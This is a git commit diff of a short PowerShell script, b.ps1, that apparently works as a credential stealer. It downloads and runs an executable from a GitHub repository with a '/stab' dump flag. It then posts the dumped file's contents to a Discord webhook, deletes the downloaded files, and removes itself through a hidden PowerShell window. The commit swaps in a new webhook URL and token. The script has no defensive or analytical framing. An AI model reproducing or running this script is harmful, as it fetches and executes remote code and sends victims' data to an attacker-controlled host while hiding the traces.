bfcb9a97d0714becc7fc48e0ada0fbd30adfbeb2
nonamezxcvbnm <122991811+nonamezxcvbnm@users.noreply.github.com>
2023-01-18 21:21:33 +0100

    Update b.ps1

--- b.ps1
+++ b.ps1
@@ -2,10 +2,10 @@ Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutF
 Start-Sleep -Seconds 2;
 & $HOME\Desktop\p.exe /stab "$HOME\Desktop\_";
 Start-Sleep -Seconds 1;
-$webhook = "https://discord.com/api/webhooks/1065316126009069628/JTqm-qYap-5eKJ7M1CZRfWY_";
+$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";
 
 $payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
-Invoke-RestMethod -URI ($webhook + "aq0yM6LQaDCkvYfwoh7ZmlSGP2nQu8wm2jTCreFBKAxY") -Method Post -Body $payload;
+Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
 Remove-Item -Path "$HOME\Desktop\p.exe";
 Remove-Item -Path "$HOME\Desktop\_";
 Start PowerShell -windowStyle hidden {"Remove-Item -Path $HOME\Desktop\b.ps1"};
